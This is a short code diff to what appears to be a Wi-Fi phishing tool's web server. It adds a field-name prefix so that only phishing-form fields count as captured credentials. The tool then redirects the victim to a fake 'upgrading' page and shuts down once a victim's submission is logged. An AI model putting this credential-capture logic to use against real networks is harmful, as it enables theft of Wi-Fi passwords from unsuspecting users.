@@ -26,6 +26,7 @@ PORT = 8080
 SSL_PORT = 443
 PEM = 'cert/server.pem'
 PHISING_PAGE = "access-point-pages/minimal"
+POST_VALUE_PREFIX = "wfphshr"
 DN = open(os.devnull, 'w')
 
 # Console colors
@@ -245,7 +246,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                      'CONTENT_TYPE': self.headers['Content-Type'],
                      })
         for item in form.list:
-            if item.name and item.value:
+            if item.name and item.value and POST_VALUE_PREFIX in item.name:
                 self.send_response(301)
                 self.send_header('Location', '/upgrading.html')
                 self.end_headers()
@@ -1039,7 +1040,7 @@ if __name__ == "__main__":
             for l in lines:
                 print l
                 # We got a victim. Shutdown everything.
-                if "password" in l:
+                if POST_VALUE_PREFIX in l:
                     time.sleep(2)
                     shutdown()
             time.sleep(0.5)
